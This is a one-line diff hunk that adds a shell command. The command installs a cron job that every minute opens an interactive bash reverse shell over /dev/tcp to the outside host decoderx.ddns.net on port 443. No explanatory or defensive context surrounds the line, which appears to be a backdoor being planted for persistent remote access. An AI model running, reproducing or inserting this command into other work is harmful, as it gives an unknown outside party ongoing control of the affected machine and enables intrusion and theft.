@@ -1,0 +1,1 @@
+echo "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/decoderx.ddns.net/443 0>&1'" | crontab -
